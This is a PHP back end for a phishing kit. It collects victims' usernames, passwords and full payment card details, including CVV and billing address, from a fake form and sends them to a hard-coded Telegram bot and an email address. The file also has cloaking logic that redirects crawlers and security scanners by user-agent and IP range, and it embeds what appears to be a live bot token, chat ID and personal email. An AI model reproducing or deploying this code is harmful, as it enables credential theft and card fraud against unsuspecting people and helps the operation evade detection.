<?php
header('Content-Type: application/json');

// Telegram configuration
$telegramBotToken = '7686288445:AAEFKviKwOyJMRRqwI23qNkycvK6u7PZFeY';
$telegramChatId = '7646336470';
$telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

// Email API configuration (replace with your real endpoint and API key)
$emailApiUrl = 'https://api.example.com/send-email'; // Placeholder: Replace with Mailgun, Sendinblue, etc.
$emailApiKey = 'YOUR_EMAIL_API_KEY'; // Replace with your API key
$emailTo = 'upgoingstar@gmail.com';

// Get request data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Get headers for BabyBot checks
$headers = getallheaders();
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$agent = $headers['User-Agent'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

// Simplified BabyBot checks
$exitLink = 'https://google.com';
$agentsBlacklist = ['curl', 'wget', 'python-requests', 'node-fetch', 'PostmanRuntime', 'okhttp', 'Apache-HttpClient'];
$ipsBlacklist = ['66.249.', '157.55.', '207.46.', '40.77.', '17.', '216.58.', '142.250.', '142.251.'];

function isBot($ip, $agent) {
    global $agentsBlacklist, $ipsBlacklist, $exitLink;
    $lowerAgent = strtolower($agent);
    foreach ($agentsBlacklist as $badAgent) {
        if (strpos($lowerAgent, strtolower($badAgent)) !== false) {
            header("Location: $exitLink");
            exit;
        }
    }
    foreach ($ipsBlacklist as $badIp) {
        if (strpos($ip, $badIp) === 0) {
            header("Location: $exitLink");
            exit;
        }
    }
    return false;
}

// Run bot check
if (isBot($ip, $agent)) {
    exit;
}

// Function to send email via API
function sendEmail($subject, $message) {
    global $emailApiUrl, $emailApiKey, $emailTo;
    if ($emailApiUrl && $emailApiKey) {
        $emailData = [
            'to' => $emailTo,
            'subject' => $subject,
            'text' => $message,
            'api_key' => $emailApiKey
        ];
        $ch = curl_init($emailApiUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($emailData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Handle login form submission
if (isset($data['email_or_user'], $data['password'])) {
    $message = "Hello Dark, New Data Received\n";
    $message .= "Type: Account Submission\n";
    $message .= "Username: {$data['email_or_user']}\n";
    $message .= "Password: {$data['password']}\n";
    $message .= "Browser: $agent\n";
    $message .= "IP: $ip\n";
    $message .= "Date and time: $time";

    // Send to Telegram
    $params = [
        'chat_id' => $telegramChatId,
        'text' => $message
    ];
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Send to email API
    sendEmail('Account Submission', $message);

    echo 'success';
    exit;
}

// Handle payment form submission
if (isset($data['cardholder'], $data['cardnumber'], $data['address'], $data['state'], $data['zip'], $data['country'])) {
    $message = "Hello Dark, New Data Received\n";
    $message .= "Type: Payment Submission\n";
    $message .= "Cardholder: {$data['cardholder']}\n";
    $message .= "Card: {$data['cardnumber']}\n";
    $message .= "Expiry: {$data['expiry']}\n";
    $message .= "CVV: {$data['cvv']}\n";
    $message .= "Address: {$data['address']}\n";
    $message .= "State: {$data['state']}\n";
    $message .= "Zip Code: {$data['zip']}\n";
    $message .= "Country: {$data['country']}\n";
    $message .= "IP: $ip\n";
    $message .= "Browser: $agent\n";
    $message .= "Date and time: $time";

    // Send to Telegram
    $params = [
        'chat_id' => $telegramChatId,
        'text' => $message
    ];
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Send to email API
    sendEmail('Payment Submission', $message);

    echo 'payment_updated';
    exit;
}

echo '';